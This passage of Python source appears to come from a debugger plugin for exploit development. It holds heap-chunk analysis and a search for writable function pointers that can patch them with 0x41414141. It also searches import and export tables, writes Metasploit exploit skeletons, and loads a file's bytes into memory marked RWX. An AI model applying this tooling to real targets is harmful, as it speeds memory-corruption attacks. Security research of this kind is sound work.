												objects[objectptr-block] = [objectinfo,objconstr]
											objsize = 0
											if findvtablesize:
												if not objconstr in mnproc.vtableCache:
													cmd2run = "u %s::CreateElement L 12" % objconstr
													objoutput = dbg.nativeCommand(cmd2run)
													if not "HeapAlloc" in objoutput:
														cmd2run = "x %s::operator*" % objconstr
														oplist = dbg.nativeCommand(cmd2run)
														oplines = oplist.split("\n")
														oppat = "%s::operator" % objconstr
														for opline in oplines:
															if oppat in opline and not "del" in opline:
																lineparts = opline.split(" ")
																cmd2run = "uf %s" % lineparts[0]
																objoutput = dbg.nativeCommand(cmd2run)
																break
													if "HeapAlloc" in objoutput:
														objlines = objoutput.split("\n")
														lineindex = 0
														for objline in objlines:
															if "HeapAlloc" in objline:
																if lineindex >= 3:
																	sizeline = objlines[lineindex-3]
																	if "push" in sizeline:
																		sizelineparts = sizeline.split("push")
																		if len(sizelineparts) > 1:
																			sizevalue = sizelineparts[len(sizelineparts)-1].replace(" ","").replace("h","")
																			try:
																				objsize = hexStrToInt(sizevalue)
																				# adjust allocation granulariy
																				remainsize = objsize - ((objsize / 8) * 8)
																				while remainsize != 0:
																					objsize += 1
																					remainsize = objsize - ((objsize / 8) * 8)
																			except:
																				#print traceback.format_exc()
																				objsize = 0
																		break
															lineindex += 1
												mnproc.vtableCache[objconstr] = objsize
											else:
												objsize = mnproc.vtableCache[objconstr]
							# remove object entries that belong to the same object
							allobjects = []
							objectstodelete = []
							for optr in objects:
								allobjects.append(optr)
							allobjects.sort()
							skipuntil = 0
							for optr in allobjects:
								if optr < skipuntil:
									objectstodelete.append(optr)
								else:
									objname = objects[optr][1]
									objsize = 0
									try:
										objsize = mnproc.vtableCache[objname]
									except:
										objsize = 0
									skipuntil = optr + objsize
							# remove vtable lines that are too close to each other
							minvtabledistance = 0x0c
							prevvname = ""
							prevptr = 0
							thisvname = ""
							for optr in allobjects:
								thisvname = objects[optr][1]
								if thisvname == prevvname and (optr - prevptr) <= minvtabledistance:
									if not optr in objectstodelete:
										objectstodelete.append(optr)
								else:
									prevptr = optr
									prevvname = thisvname


							for vtableptr in objectstodelete:
								del objects[vtableptr]

							for obj in objects:
								orderedobj.append(obj)

							for ascstring in asciistrings:
								orderedobj.append(ascstring)

							for unicodestring in unicodestrings:
								orderedobj.append(unicodestring)

							for bstrobj in bstr:
								orderedobj.append(bstrobj)

							orderedobj.sort()

							# print out details for this chunk
							chunkprefix = ""
							fieldname1 = "Usersize"
							fieldname2 = "ChunkSize"
							if infotype == "virtualallocdblocks":
								chunkprefix = "VA "
								fieldname1 = "CommitSize"
							tolog = "%sChunk 0x%08x (%s 0x%x, %s 0x%x) : %s" % (chunkprefix,block,fieldname1,usersize,fieldname2,usersize+unused,flags)
							if showdata:
								dbg.log(tolog)
							logfile_l.write(tolog,thislog_l)

							previousptr = block
							previoussize = 0
							showinlog = False
							for ptr in orderedobj:
								ptrtype = ""
								ptrinfo = ""
								data = ""
								alldata = ""
								blockinfo = ""
								ptrbytes = 0
								endptr = 0
								datasize = 0
								ptrchars = 0
								infoptr = block + ptr
								endptr = 0
								if ptr in asciistrings:
									ptrtype = "String"
									dataend = asciistrings[ptr]
									data = blockmem[ptr:dataend]
									alldata = data
									ptrbytes = len(data)
									ptrchars = ptrbytes
									datasize = ptrbytes
									if ptrchars > 100:
										data = data[0:100]+b"..."
									blockinfo = "%s (Data : 0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
									infoptr = block + ptr
									endptr = infoptr + ptrchars -  1  # need -1
								elif ptr in bstr:
									ptrtype = "BSTR"
									dataend = bstr[ptr]
									data = blockmem[ptr:dataend].replace(b"\x00",b"")
									alldata = data
									ptrchars = len(data)
									ptrbytes = ptrchars*2
									datasize = ptrbytes+6
									infoptr = block + ptr - 3
									if ptrchars > 100:
										data = data[0:100]+b"..."
									blockinfo = "%s 0x%x/%d bytes (Data : 0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes+6,ptrbytes+6,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
									endptr = infoptr + ptrbytes + 6
								elif ptr in unicodestrings:
									ptrtype = "Unicode"
									dataend = unicodestrings[ptr]
									data = blockmem[ptr:dataend].replace(b"\x00",b"")
									alldata = ""
									ptrchars = len(data)
									ptrbytes = ptrchars * 2
									datasize = ptrbytes
									if ptrchars > 100:
										data = data[0:100]+b"..."
									blockinfo = "%s (0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
									endptr = infoptr + ptrbytes + 2
								elif ptr in objects:
									ptrtype = "Object"
									data = objects[ptr][0]
									vtablename = objects[ptr][1]
									datasize = 0
									if vtablename in mnproc.vtableCache:
										datasize = mnproc.vtableCache[vtablename]
									alldata = data
									if datasize > 0:
										blockinfo = "%s (0x%x bytes): %s" % (ptrtype,datasize,data)
									else:
										blockinfo = "%s : %s" % (ptrtype,data)
									endptr = infoptr + datasize

								# calculate delta
								slackspace = infoptr - previousptr
								if endptr > 0 and not ptrtype=="Object":
									if slackspace >= 0:
										tolog = "  +%04x @ %08x->%08x : %s" % (slackspace,infoptr,endptr,blockinfo)
									else:
										tolog = "       @ %08x->%08x : %s" % (infoptr,endptr,blockinfo)
								else:
									if slackspace >= 0:
										if endptr != infoptr:
											tolog = "  +%04x @ %08x->%08x : %s" % (slackspace,infoptr,endptr,blockinfo)
										else:
											tolog = "  +%04x @ %08x           : %s" % (slackspace,infoptr,blockinfo)
									else:
										tolog = "        @ %08x           : %s" % (infoptr,blockinfo)

								if filterafter == "" or (filterafter != "" and filterafter in alldata):
									showinlog = True  # keep this for the entire block
									if (filterafter != ""):
										nr_filter_matches += 1
								if showinlog:
									if showdata:
										dbg.log(tolog)
									logfile_l.write(tolog,thislog_l)
								
								previousptr = endptr
								previoussize = datasize

				# save vtableCache again
				if filterafter != "":
					tolog = "Nr of filter matches: %d" % nr_filter_matches
					if showdata:
						dbg.log("")
						dbg.log(tolog)
					logfile_l.write("",thislog_l)
					logfile_l.write(tolog,thislog_l)
				dbg.addKnowledge("vtableCache",mnproc.vtableCache)


			if searchtype in ["segments","all","chunks"] or "stat" in args:
				segments = getSegmentsForHeap(heapbase)
				hline = "Segment List for heap %s:" % (PTR_PRINT % heapbase)
				dbg.log(hline)
				dbg.log("-" * len(hline))
				sortedsegments = []
				for seg in segments:
					sortedsegments.append(seg)
				if not win7mode:
					sortedsegments.sort()
				vablocks = []
				# VirtualAllocdBlocks
				vachunks = mHeap.getVirtualAllocdBlocks()
				infoblocks = {}
				infoblocks["segments"] = sortedsegments
				if searchtype in ["all","chunks"]:
					infoblocks["virtualallocdblocks"] = [vachunks]

				for infotype in infoblocks:
					heapdata = infoblocks[infotype]
					for thisdata in heapdata:
						tolog = ""
						if infotype == "segments":
							# 0 : segmentstart
							# 1 : segmentend
							# 2 : firstentry
							# 3 : lastentry
							seg = thisdata
							segstart = segments[seg][0]
							segend = segments[seg][1]
							segsize = segend-segstart
							FirstEntry = segments[seg][2]
							LastValidEntry = segments[seg][3]
							tolog = "Segment %s - %s (FirstEntry: %s - LastValidEntry: %s): %s bytes" % (PTR_PRINT % segstart, PTR_PRINT % segend, PTR_PRINT % FirstEntry, PTR_PRINT % LastValidEntry, PTR_PRINT % segsize)
						if infotype == "virtualallocdblocks":
							vablocks = heapdata
							tolog = "Heap : %s%s : VirtualAllocdBlocks : %d " % (PTR_PRINT % heapbase, heapbase_extra, len(vachunks))
						#dbg.log("")
						dbg.log(tolog)
						if searchtype == "chunks" or "stat" in args:
							try:
								logfile_b.write("Heap: %s%s" % (PTR_PRINT % heapbase, heapbase_extra),thislog_b)
								#logfile_b.write("",thislog_b)
								logfile_b.write(tolog,thislog_b)
							except:
								pass
							if infotype == "segments":
								datablocks = walkSegment(FirstEntry,LastValidEntry,heapbase)
							else:
								datablocks = heapdata[0]
							tolog = "    Nr of chunks : %d " % len(datablocks)
							dbg.log(tolog)
							try:
								logfile_b.write(tolog,thislog_b)
							except:

								pass
							if len(datablocks) > 0:
								tolog = "    _HEAP_ENTRY  psize   size  unused  UserPtr   UserSize"
								dbg.log(tolog)
								try:
									logfile_b.write(tolog,thislog_b)
								except:
									pass
								sortedblocks = []
								for block in datablocks:
									sortedblocks.append(block)
								sortedblocks.sort()
								nextblock = 0
								segstatinfo = {}
								for block in sortedblocks:
									showinlog = False
									thischunk = datablocks[block]
									if infotype == "virtualallocdblocks":
										vainfo = thischunk
										unused = 0
										headersize = 0
										flagtxt = "VirtualAllocd"
										userptr = block
										psize = 0
										selfsize = vainfo["commit_size"]
										blocksize = selfsize
										usersize = selfsize
										extratxt = " (0x%x bytes committed, 0x%x reserved)" % (vainfo["commit_size"], vainfo["reserve_size"])
										nextblock = 0
									else:
										unused = thischunk.unused
										headersize = thischunk.headersize
										flagtxt = getHeapFlag(thischunk.flag)
										if "virtallocd" in flagtxt.lower():
											flagtxt += " (LFH)"
											flagtxt = flagtxt.replace("Virtallocd","Internal")
										userptr = block + headersize
										psize = thischunk.prevsize * 8
										blocksize = thischunk.size * 8
										selfsize = blocksize
										usersize = blocksize - unused
										extratxt = ""
										nextblock = block + blocksize

									if not "stat" in args:
										tolog = "       %08x  %05x  %05x   %05x  %08x  %08x (%d) (%s) %s" % (block,psize,selfsize,unused,block+headersize,usersize,usersize,flagtxt,extratxt)
										dbg.log(tolog)
										logfile_b.write(tolog,thislog_b)
									else:
										if not usersize in segstatinfo:
											segstatinfo[usersize] = 1
										else: 
											segstatinfo[usersize] += 1
								
								if nextblock > 0 and nextblock < LastValidEntry:
									if not "stat" in args:
										nextblock -= headersize
										restbytes = LastValidEntry - nextblock
										tolog = "       0x%08x - 0x%08x (end of segment) : 0x%x (%d) uncommitted bytes" % (nextblock,LastValidEntry,restbytes,restbytes)
										dbg.log(tolog)
										logfile_b.write(tolog,thislog_b)
								if "stat" in args:
									statinfo[segstart] = segstatinfo
									# show statistics
									orderedsizes = []
									totalalloc = 0
									for thissize in segstatinfo:
										orderedsizes.append(thissize)
										totalalloc += segstatinfo[thissize] 
									orderedsizes.sort(reverse=True)
									tolog = "    Segment Statistics:"
									dbg.log(tolog)
									try:
										logfile_b.write(tolog,thislog_b)
									except:
										pass
									for thissize in orderedsizes:
										nrblocks = segstatinfo[thissize]
										percentage = (float(nrblocks) / float(totalalloc)) * 100
										tolog = "    Size : 0x%x (%d) : %d chunks (%.2f %%)" % (thissize,thissize,nrblocks,percentage)

										dbg.log(tolog)
										try:
											logfile_b.write(tolog,thislog_b)
										except:
											pass
									tolog = "    Total chunks : %d" % totalalloc
									dbg.log(tolog)
									try:
										logfile_b.write(tolog,thislog_b)
									except:
										pass
									tolog = ""
									try:
										logfile_b.write(tolog,thislog_b)
									except:
										pass
									dbg.log("")
								dbg.log("")


		if "stat" in args and len(statinfo) > 0:
			tolog = "Global statistics"
			dbg.log(tolog)
			try:
				logfile_b.write(tolog,thislog_b)
			except:
				pass
			globalstats = {}
			allalloc = 0
			for seginfo in statinfo:
				segmentstats = statinfo[seginfo]
				for size in segmentstats:
					allalloc += segmentstats[size]
					if not size in globalstats:
						globalstats[size] = segmentstats[size]
					else:
						globalstats[size] += segmentstats[size]
			orderedstats = []
			for size in globalstats:
				orderedstats.append(size)
			orderedstats.sort(reverse=True)
			for thissize in orderedstats:
				nrblocks = globalstats[thissize]
				percentage = (float(nrblocks) / float(allalloc)) * 100
				tolog = "  Size : 0x%x (%d) : %d chunks (%.2f %%)" % (thissize,thissize,nrblocks,percentage)
				dbg.log(tolog)
				try:
					logfile_b.write(tolog,thislog_b)
				except:
					pass
			tolog = "  Total chunks : %d" % allalloc
			dbg.log(tolog)
			try:
				logfile_b.write(tolog,thislog_b)
			except:
				pass
	#dbg.log("%s" % "*" * 90)					
	return

def procGetIAT(args):
	return procGetxAT(args,"iat")

def procGetEAT(args):
	return procGetxAT(args,"eat")

def procFwptr(args):
	modulecriteria = {}
	criteria = {}			
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
	if not "aslr" in modulecriteria:
		modulecriteria["aslr"] = False
	if not "rebase" in modulecriteria:
		modulecriteria["rebase"] = False

	modulestosearch = getModulesToQuery(modulecriteria)
	allpages = dbg.getMemoryPages()
	orderedpages = []
	for page in allpages.keys():
		orderedpages.append(page)
	orderedpages.sort()
	pagestoquery = {}
	fwptrs = {}

	dict_fwptr_details = {}

	objwptr = MnLog("wptr.txt")
	wptrfile = objwptr.reset()

	setbps = False
	dopatch = False
	dofreelist = False

	if "bp" in args:
		setbps = True

	if "patch" in args:
		dopatch = True

	if "freelist" in args:
		dofreelist = True

	chunksize = 0
	offset = 0

	if "chunksize" in args:
		if type(args["chunksize"]).__name__.lower() != "bool":
			try:
				if str(args["chunksize"]).lower().startswith("0x"):
					chunksize = int(args["chunksize"],16)
				else:
					chunksize = int(args["chunksize"])
			except:
				chunksize = 0
		if chunksize == 0 or chunksize > 0xffff:
			dbg.log("[!] Invalid chunksize specified")
			if chunksize > 0xffff:
				dbg.log("[!] Chunksize must be <= 0xffff")
				chunksize == 0
				return
		else:
			dbg.log("[+] Will filter on chunksize 0x%0x" % chunksize )
	if dofreelist:
		if "offset" in args:
			if type(args["offset"]).__name__.lower() != "bool":
				try:
					if str(args["offset"]).lower().startswith("0x"):
						offset = int(args["offset"],16)
					else:
						offset = int(args["offset"])
				except:
					offset = 0
			if offset == 0:
				dbg.log("[!] Invalid offset specified")
			else:
				dbg.log("[+] Will add 0x%0x bytes between flink/blink and fwptr" % offset )			

	if not silent:
		if setbps:
			dbg.log("[+] Will set breakpoints on found CALL/JMP")
		if dopatch:
			dbg.log("[+] Will patch target for CALL/JMP with 0x41414141")
		dbg.log("[+] Criteria in use: %s" % criteriaToText(modulecriteria))
		dbg.log("[+] Extracting .text/.code sections from %d modules" % len(modulestosearch))
		dbg.updateLog()

	if len(modulestosearch) > 0:		
		for thismodule in modulestosearch:
			# find text section
			for thispage in orderedpages:
				page = allpages[thispage]
				pagestart = page.getBaseAddress()
				pagesize = page.getSize()
				ptr = MnPointer(pagestart)
				mod = ""
				sectionname = ""
				try:
					mod = ptr.belongsTo()
					if mod == thismodule:
						sectionname = page.getSection()
						if sectionname == ".text" or sectionname == ".code":	
							pagestoquery[mod] = [pagestart,pagestart+pagesize]
							break
				except:
					pass
	if len(pagestoquery) > 0:
		if not silent:
			dbg.log("[+] Analysing .text/.code sections")
			dbg.updateLog()
		for modname in pagestoquery:
			interruptMona()
			tmodcnt = 0
			nr_sizematch = 0
			pagestart = pagestoquery[modname][0]
			pageend = pagestoquery[modname][1]
			if not silent:
				dbg.log("    - Carving through %s (0x%08x - 0x%08x)" % (modname,pagestart,pageend))
				dbg.updateLog()
			loc = pagestart
			while loc < pageend:
				try:
					thisinstr = dbg.disasm(loc)
					instrbytes = thisinstr.getDump()
					if thisinstr.isJmp() or thisinstr.isCall():
						# check if it's reading a pointer from somewhere
						instrtext = getDisasmInstruction(thisinstr)
						opcodepart = instrbytes.upper()[0:4]
						if DEBUG_MODE:
							dbg.log("Location: 0x%08x, Opcode: %s, Instruction: %s" % (loc, opcodepart,instrtext))
						if opcodepart == "FF15" or opcodepart == "FF25":
							if "[" in instrtext and "]" in instrtext:
								parts1 = instrtext.split("[")
								if len(parts1) > 1:
									parts2 = parts1[1].split("]")
									addy = parts2[0]
									# get the actual value and check if it's writeable
									if "(" in addy and ")" in addy:
										parts1 = addy.split("(")
										parts2 = parts1[1].split(")")
										addy = parts2[0]
									if isHexValue(addy):
										addyval = hexStrToInt(addy)
										access = getPointerAccess(addyval)
										if "WRITE" in access:
											if meetsCriteria(addyval,criteria):
												savetolog = False
												sizeinfo = ""
												if chunksize == 0:
													savetolog = True
												else:
													# check if this location could acts as a heap chunk for a certain size
													# the size field would be placed at the current location - 8 bytes
													# and is 2 bytes large
													sizeval = 0
													if not dofreelist:
														sizeval = struct.unpack('<H',dbg.readMemory(addyval-8,2))[0]
														if sizeval >= chunksize:
															savetolog = True
															nr_sizematch += 1
															sizeinfo = " Chunksize: %d (0x%02x) - " % ((sizeval*8),(sizeval*8))																
													else:
														sizeval = struct.unpack('<H',dbg.readMemory(addyval-8-offset,2))[0]
														#
														flink = struct.unpack('<L',dbg.readMemory(addyval-offset,4))[0]
														blink = struct.unpack('<L',dbg.readMemory(addyval+4-offset,4))[0]
														aflink = getPointerAccess(flink)
														ablink = getPointerAccess(blink)
														if "READ" in aflink and "READ" in ablink:
															extr = ""
															if sizeval == chunksize or sizeval == chunksize + 1:
																extr = " **size match**"
																nr_sizematch += 1
															sizeinfo = " Chunksize: %d (0x%02x)%s, UserPtr 0x%08x, Flink 0x%08x, Blink 0x%08x - " % ((sizeval*8),(sizeval*8),extr,addyval-offset,flink,blink)
															savetolog = True
												if savetolog:
													fwptrs[loc] = addyval
													tmodcnt += 1
													ptrx = MnPointer(addyval)
													mod = ptrx.belongsTo()
													if len(dict_fwptr_details) < 20:
														dict_fwptr_details[loc] = [addyval, instrtext, mod, ptrx.__str__(), sizeinfo]
													tofile = "0x%08x : 0x%08x gets called from %s at 0x%08x (%s) - %s%s" % (addyval,addyval,mod,loc,instrtext,sizeinfo,ptrx.__str__())
													objwptr.write(tofile,wptrfile)
													if setbps:
														dbg.setBreakpoint(loc)
													if dopatch:
														dbg.writeLong(addyval,0x41414141)
					if len(instrbytes) > 0:
						loc = loc + len(instrbytes)//2
					else:
						loc = loc + 1
				except Exception as e:
					if DEBUG_MODE:
						dbg.log("Error disassembling at 0x%08x: %s" % (int(loc), str(e)))
						dbg.log(traceback.format_exc())
					loc = loc + 1
					continue
			if not silent:
				dbg.log("      Found %d pointers" % tmodcnt)
				if chunksize > 0:
					dbg.log("      %d pointers with size match" % nr_sizematch)								

		if len(dict_fwptr_details) > 0:
			dbg.log("")
			dbg.log("[+] Showing up to 20 results. Check logfile for all pointers")
			dbg.log("")
			headers = ["Address", "Target", "Instruction", "Module", "ACL/Pointer", "Sizeinfo"]
			types = ["pointer", "pointer", "string", "string", "string", "string"]

			print_dict_table(dict_fwptr_details, headers, types, padding = "    ", itemsequence = [])	

			dbg.log(" ")

	return

def procGetxAT(args,mode=""):

	keywords = []
	keywordstring = ""
	modulecriteria = {}
	criteria = {}

	thisxat = {}

	# for cosmetics
	# IAT: key = pointer
	# extra fields: module, base+offset, functionpointer, functionname, module it belongs to, moduleproperties
	iat_table = {}

	eat_table = {}

	entriesfound = 0
	
	if "s" in args:
		if type(args["s"]).__name__.lower() != "bool":
			keywordstring = args["s"].replace("'","").replace('"','')
			keywords = keywordstring.split(",")
	
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
	
	modulestosearch = getModulesToQuery(modulecriteria)
	if not silent:
		dbg.log("[+] Criteria: %s" % criteriaToText(modulecriteria))
		dbg.log("[+] Querying %d modules" % len(modulestosearch))
	
	if len(modulestosearch) > 0:
	
		xatfilename="%ssearch.txt" % mode
		objxatfilename = MnLog(xatfilename)
		xatfile = objxatfilename.reset()
	
		for thismodule in modulestosearch:
			thismod = MnModule(thismodule)
			thismod_info = "%s" % thismod.__str__()
			thismodule = thismod.getShortName()
			thismodule_fullname = thismod.moduleFilename

			if not silent:
				dbg.log("")
				dbg.log("    Querying %s of module '%s'" % (mode, thismodule_fullname))

			if mode == "iat":
				thisxat = thismod.getIAT()
			else:
				thisxat = thismod.getEAT()

			for thisfunc in thisxat:
				thisfuncname = thisxat[thisfunc].lower()
				origfuncname = thisfuncname
				firstindex = thisfuncname.find(".")
				if firstindex > 0:
					thisfuncname = thisfuncname[firstindex+1:len(thisfuncname)]
				addtolist = False
				iatptr_modname = ""
				modinfohr = ""
				theptr = 0
				if mode == "iat":
					try:
						theptr = struct.unpack(PTR_FMT,dbg.readMemory(thisfunc,PTR_SIZE))[0]
						targetMod = mnproc.getModuleForAddress(theptr)
						if targetMod is not None:
							iatptr_modname = targetMod.getShortName()
							modinfohr = "%s" % targetMod
							if "!" not in origfuncname:
								origfuncname = iatptr_modname.lower() + "!" + origfuncname
								thisfuncname = origfuncname
							else:
								oparts = origfuncname.split("!")
								origfuncname = iatptr_modname.lower() + "!" + oparts[1]
					except Exception as e:
						dbg.log("Error in procGetxAT: %s" % str(e))
						continue

				if mode == "eat":
					modinfohr = thismod_info

				if len(keywords) > 0:
					for keyword in keywords:
						keyword = keyword.lower().strip()
						if ((keyword.startswith("*") and keyword.endswith("*")) or keyword.find("*") < 0):
							keyword = keyword.replace("*","")
							if thisfuncname.find(keyword) > -1:
								addtolist = True
								break
						if keyword.startswith("*") and not keyword.endswith("*"):
							keyword = keyword.replace("*","")
							if thisfuncname.endswith(keyword):
								addtolist = True
								break
						if keyword.endswith("*") and not keyword.startswith("*"):
							keyword = keyword.replace("*","")
							if thisfuncname.startswith(keyword):
								addtolist = True
								break
				else:
					addtolist = True

				if addtolist:
					entriesfound += 1
					# add info about the module
					if mode == "iat":
						thedelta = thisfunc - thismod.moduleBase
						iat_table[thisfunc] = [thismodule_fullname.lower(), thedelta, theptr, origfuncname, modinfohr]
						logentry = "At 0x%s in %s (base + 0x%s) : 0x%s (ptr to %s) %s" % (toHex(thisfunc),thismodule_fullname.lower(),toHex(thedelta),toHex(theptr),origfuncname,modinfohr)
					if mode == "eat":
						thedelta = thisfunc - thismod.moduleBase
						logentry = "0x%08x : %s!%s (0x%08x+0x%08x)" % (thisfunc,thismodule_fullname.lower(),origfuncname,thismod.moduleBase,thedelta)
						eat_table[thisfunc] = ["%s!%s" % (thismodule_fullname.lower(), origfuncname), "(0x%08x+0x%08x)" % (thismod.moduleBase, thedelta), modinfohr ]
						#dbg.log(logentry,address = thisfunc)
					objxatfilename.write(logentry,xatfile)
	
		if mode == "iat":
			dbg.log("")
			dbg.log("Results of the IAT search: %d entries found" % entriesfound )			
			headers = ["IAT Location", "In Module", "( = RVA)", "Contains","Which is address of function","Info about module the function belongs to" ]
			types   = ["pointer", "string", "pointer", "pointer", "string", "string"]
			dbg.log("")
			print_dict_table(iat_table, headers, types, padding = "    ", itemsequence = [])
		if mode == "eat":
			dbg.log("")
			dbg.log("Results of the EAT search: %d entries found" % entriesfound )
			headers = ["FuncPtr", "Module!Exported Function Name", "Module Base + Offset", "Info about this module" ]
			types   = ["pointer", "string", "string", "string"]
			dbg.log("")
			print_dict_table(eat_table, headers, types, padding = "    ", itemsequence = [])			

		if not silent:
			dbg.log("")
			dbg.log("%d entries found" % entriesfound)
	return

	
#-----Metasploit module skeleton-----#
def procSkeleton(args):

	cyclicsize = 5000
	if "c" in args:
		if type(args["c"]).__name__.lower() != "bool":
			try:
				cyclicsize = int(args["c"])
			except:
				cyclicsize = 5000

	exploittype = ""
	skeletonarg = ""
	usecliargs = False
	validstypes ={}
	validstypes["tcpclient"] = "network client (tcp)"
	validstypes["udpclient"] = "network client (udp)"
	validstypes["fileformat"] = "fileformat"
	exploittypes = [ "fileformat","network client (tcp)","network client (udp)" ]
	errorfound = False
	if __DEBUGGERAPP__ == "WinDBG" or "t" in args:
		if "t" in args:
			if type(args["t"]).__name__.lower() != "bool":
				skeltype = args["t"].lower()
				skelparts = skeltype.split(":")
				if skelparts[0] in validstypes:
					exploittype = validstypes[skelparts[0]]
					if len(skelparts) > 1:
						skeletonarg = skelparts[1]
					else:
						errorfound = True
					usecliargs = True
				else:
					errorfound = True
			else:
				errorfound = True
		else:
			errorfound = True
	# ask for type of module
	else:
		dbg.log(" ** Please select a skeleton exploit type from the dropdown list **",highlight=1)
		exploittype = dbg.comboBox("Select msf exploit skeleton to build :", exploittypes).lower().strip()

	if errorfound:
		dbg.log(" ** Please specify a valid skeleton type and argument **",highlight=1)
		dbg.log("    Valid types are : tcpclient:argument, udpclient:argument, fileformat:argument")
		dbg.log("    Example : skeleton for a pdf file format exploit: -t fileformat:pdf")
		dbg.log("              skeleton for tcp client against port 123: -t tcpclient:123")
		return
	if not exploittype in exploittypes:
		dbg.log("Boo - invalid exploit type, try again !",highlight=1)
		return
		
	portnr = 0
	extension = ""
	if exploittype.find("network") > -1:
		if usecliargs:
			portnr = skeletonarg
		else:
			portnr = dbg.inputBox("Remote port number : ")
		try:
			portnr = int(portnr)
		except:
			portnr = 0

	if exploittype.find("fileformat") > -1:
		if usecliargs:
			extension = skeletonarg
		else:
			extension = dbg.inputBox("File extension :")
	
	extension = extension.replace("'","").replace('"',"").replace("\n","").replace("\r","")
	
	if not extension.startswith("."):
		extension = "." + extension			
	
	exploitfilename="msfskeleton.rb"
	objexploitfile = MnLog(exploitfilename)
	global noheader
	noheader = True
	exploitfile = objexploitfile.reset(showheader=False,skipModuleTable=True)			
	noheader = False

	modulecriteria = {}
	criteria = {}
	
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
	
	badchars = ""
	if "badchars" in criteria:
		badchars = criteria["badchars"]
		
	if "nonull" in criteria:
		if not '\x00' in badchars:
			badchars += '\x00'			
	
	skeletonheader,skeletoninit,skeletoninit2 = getSkeletonHeader(exploittype,portnr,extension,"",badchars)
	
	targetstr = "      'Targets'    =>\n"
	targetstr += "        [\n"
	targetstr += "          [ '<fill in the OS/app version here>',\n"
	targetstr += "            {\n"
	targetstr += "              'Ret'     =>  0x00000000,\n"
	targetstr += "              'Offset'  =>  0\n"
	targetstr += "            }\n"
	targetstr += "          ],\n"
	targetstr += "        ],\n"
	
	exploitstr = "  def exploit\n\n"
	if exploittype.find("network") > -1:
		if exploittype.find("tcp") > -1:
			exploitstr += "\n    connect\n\n"
		elif exploittype.find("udp") > -1:
			exploitstr += "\n    connect_udp\n\n"
	
	exploitstr += "    buffer = Rex::Text.pattern_create(" + str(cyclicsize) + ")\n"
	
	if exploittype.find("network") > -1:
		exploitstr += "\n    print_status(\"Trying target #{target.name}...\")\n"	
		if exploittype.find("tcp") > -1:
			exploitstr += "    sock.put(buffer)\n"
			exploitstr += "\n    handler\n"
		elif exploittype.find("udp") > -1:
			exploitstr += "    udp_sock.put(buffer)\n"
			exploitstr += "\n    handler(udp_sock)\n"			
	if exploittype == "fileformat":
		exploitstr += "\n    file_create(buffer)\n\n"						
	if exploittype.find("network") > -1:
		exploitstr += "    disconnect\n\n"						
		
	exploitstr += "  end\n"				
	
	objexploitfile.write(skeletonheader+"\n",exploitfile)
	objexploitfile.write(skeletoninit+"\n",exploitfile)
	objexploitfile.write(targetstr,exploitfile)
	objexploitfile.write(skeletoninit2,exploitfile)		
	objexploitfile.write(exploitstr,exploitfile)
	objexploitfile.write("end",exploitfile)	
	
	
	return



def procLoad(args):
	"""
	Loads the content of a file into memory at a specified location (default: EIP/RIP)
	"""

	# checks the args
	# file ok?
	inputfile = ""
	targetloc = ""
	if arch == 32:
		targetloc = "eip"
	if arch == 64:
		targetloc = "rip"

	if "a" in args:
		if type(args["a"]).__name__.lower() != "bool":
			targetloc = args["a"]
	elif "dst" in args:
		if type(args["dst"]).__name__.lower() != "bool":
			targetloc = args["dst"]
	elif "r" in args:
		if type(args["r"]).__name__.lower() != "bool":
			targetloc = args["r"]

	# convert argument to address
	addr, addrok = getAddyArg(targetloc)

	if not addrok:
		dbg.log("Invalid target location provided with -a", highlight=1)
		dbg.log("   Unable to resolve %s" % targetloc)
		return

	if "f" in args:
		if type(args["f"]).__name__.lower() != "bool":
			inputfile = args["f"]

	if inputfile == "":
		dbg.log("Missing argument -f <source filename>",highlight=1)
		return

	inputfile = inputfile.replace("'","").replace('"',"")

	if not os.path.isfile(inputfile):
		dbg.log("Unable to read file %s" % inputfile,highlight=1)
		return

	bytes_list = fileToBin(inputfile)
	total_len = len(bytes_list)

	if total_len == 0:
		try:
			if os.path.getsize(inputfile) > 0:
				dbg.log("Unable to read file %s" % inputfile,highlight=1)
				return
		except:
			dbg.log("Unable to read file %s" % inputfile,highlight=1)
			return

	dbg.log("[+] Read %d bytes from %s" % (total_len,inputfile))	
	dbg.log("[+] Attempting to write contents of file to %s (%s)" % (targetloc, (PTR_PRINT % addr)))
	
	# Use appropriate method based on debugger type
	if __DEBUGGERAPP__ == "WinDBG":
		# WinDBG: use nativeCommand with eb (edit byte) command
		batch_size = 16
		log_every = True
		num_batches = int(math.ceil(float(total_len) / batch_size))

		for batch_idx in range(num_batches):
			start = batch_idx * batch_size
			end = min(start + batch_size, total_len)
			slice_bytes = bytes_list[start:end]

			cur_addr = addr + start
			addr_hex = "0x%X" % cur_addr

			# format bytes as two-digit hex without 0x, separated by spaces
			byte_tokens = " ".join("%02X" % (b & 0xFF) for b in slice_bytes)

			# build command: eb 0xADDR <b1> <b2> ...
			cmd = "eb %s %s" % (addr_hex, byte_tokens)

			try:
				dbg.nativeCommand(cmd)
			except Exception as e:
				dbg.log("Failed to run: %s  (error: %s)" % (cmd, e), highlight=1)
				return False

			# optional progress logging
			if log_every and ((batch_idx + 1) % log_every == 0 or batch_idx == num_batches - 1):
				written = end
				dbg.log("[+] Progress: wrote %d / %d bytes" % (written, total_len))

	else:
		# Immunity Debugger: use writeMemory directly
		try:
			# Convert bytes_list back to binary data for writeMemory
			if sys.version_info[0] < 3:
				data_to_write = "".join(chr(b) for b in bytes_list)
			else:
				data_to_write = bytes(bytes_list)
			
			dbg.writeMemory(addr, data_to_write)
			dbg.log("[+] Progress: wrote %d / %d bytes" % (total_len, total_len))
		except Exception as e:
			dbg.log("Failed to write memory at 0x%X: %s" % (addr, str(e)), highlight=1)
			return False

	dbg.log("[+] Finished writing %d bytes to %s" % (total_len, (PTR_PRINT % addr)))

	# let's make that location RWX to be sure
	if __DEBUGGERAPP__ == "WinDBG":
		dbg.rVirtualProtect(addr,1,0x40)
		dbg.log("[+] Changed ACL to RWX")
		dbg.log("[+] Done.")
	return


def procFillChunk(args):

	reference = ""
	fillchar = "A"
	allregs = getRegisters()
